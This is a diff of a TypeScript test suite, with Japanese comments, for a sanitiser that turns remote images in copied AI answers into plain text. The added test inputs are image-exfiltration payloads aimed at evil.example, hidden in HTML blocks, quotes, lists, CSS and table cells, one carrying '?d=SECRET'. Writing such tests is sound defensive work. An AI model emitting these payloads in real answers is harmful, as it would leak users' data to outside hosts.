@@ -123,6 +123,35 @@ const COPY_INPUTS = [
   '![a](&#104;ttps://evil.example/e)',
   '文の中の <img src="https://evil.example/inline"> です',
   '<picture><source srcset="https://evil.example/s"></picture>',
+  // 4 回目の確かめの形：HTML の塊の中の画像（文字にしたあとに出てくる）、引用・リストの中の 2 行にわたる画像とタグ、\r\n、コメントのあと
+  '<div>\n![a](https://evil.example/in-div)\n</div>',
+  '<p>![a](https://evil.example/in-p?d=SECRET)</p>',
+  '<details><summary>図</summary>\n![a](https://evil.example/in-details)\n</details>',
+  '<b>\n![a](https://evil.example/in-b)\n</b>',
+  '> ![a](https://evil.example/bq\n> "title")',
+  '- ![a](https://evil.example/li\n  "t")',
+  '> <img\n> src="https://evil.example/bq-img">',
+  '- x <img\n  src="https://evil.example/li-img">',
+  '![a](https://evil.example/crlf\r\n"t")',
+  '<!--\n-->![a](https://evil.example/after-comment)',
+  '<style>p{background:url(https://evil.example/css)}</style>',
+  '| a |\n|---|\n| <img src="https://evil.example/cell"> |',
+]
+
+// ふつうの答え（写しても変わらないもの）
+const ORDINARY = [
+  'コード:\n\n```ts\nconst a = b < c && d > e ? 1 : 2\nconst v: Array<string> = []\n```',
+  '`a < b` と `<div>` と `![x](y)`',
+  'a -> b, b <- c, x <= y, x >= y, a < b, a<b, 1<2, f(x)->g',
+  'Rust の Vec<T> と Java の List<String> を比べる',
+  'a<b かつ c>d のとき',
+  '| 列 | 値 |\n|---|---|\n| a | 1 |\n| b<br>c | 2 |',
+  '- [ ] やる\n- [x] やった',
+  '$x^2 < y$ と $$\\frac{a}{b}$$',
+  '[出典](https://example.org/a) と <https://example.org/b> と <a@example.com>',
+  '**太字**と <b>太字</b> と H<sub>2</sub>O と x<sup>2</sup>',
+  '改行は <br> で入れる。\n\n```html\n<p>a<br>b</p>\n```',
+  '本文[^1]\n\n[^1]: 注',
 ]
 
 describe('withoutRemoteImages（AI の答えを写すとき）', () => {
@@ -142,6 +171,23 @@ describe('withoutRemoteImages（AI の答えを写すとき）', () => {
     expect(withoutRemoteImages('![a [b]](https://evil.example/nested)')).toBe('画像「a [b]」（https://evil.example/nested）')
     // コードの中は、そのまま
     expect(withoutRemoteImages('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')).toBe('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')
+  })
+
+  it('ふつうの答えは変えない（コード・比べる記号・型の <T>・表の <br>・属性のないタグ・数式・リンク・脚注）', () => {
+    for (const text of ORDINARY) expect(withoutRemoteImages(text), text).toBe(text)
+  })
+
+  it('同じものがコードの中と外にあれば、外だけを置き換える。HTML のコメントは消す。\r\n は \n にそろえる', () => {
+    expect(withoutRemoteImages('![図](https://x.example/p.png)\n\n書き方:\n\n```md\n![図](https://x.example/p.png)\n```')).toBe(
+      '画像「図」（https://x.example/p.png）\n\n書き方:\n\n```md\n![図](https://x.example/p.png)\n```',
+    )
+    expect(withoutRemoteImages('`<img src="https://x.example/a">` と <img src="https://x.example/a">')).toBe('`<img src="https://x.example/a">` と ＜img src="https://x.example/a"＞')
+    expect(withoutRemoteImages('<!-- メモ -->本文')).toBe('本文')
+    expect(withoutRemoteImages('答え\r\n\r\n![a](https://x.example/p.png)')).toBe('答え\n\n画像「a」（https://x.example/p.png）')
+    // HTML の塊の中の画像は、塊のタグを文字にしたうえで、画像も文字にする
+    expect(withoutRemoteImages('<div>\n![a](https://x.example/in)\n</div>')).toBe('＜div＞\n画像「a」（https://x.example/in）\n＜/div＞')
+    // 場所を見つけられないもの（引用の中の 2 行の画像）は、最後の守りで ![ と < を文字にする
+    expect(withoutRemoteImages('> ![a](https://x.example/bq\n> "t")')).toBe('> ！[a](https://x.example/bq\n> "t")')
     expect(withoutRemoteImages('![点](data:image/png;base64,AAAA)')).toBe('画像「点」')
     // リンクと、画像でない文は今のまま
     expect(withoutRemoteImages('[出典](https://example.org/a) と a ! [b](c)')).toBe('[出典](https://example.org/a) と a ! [b](c)')
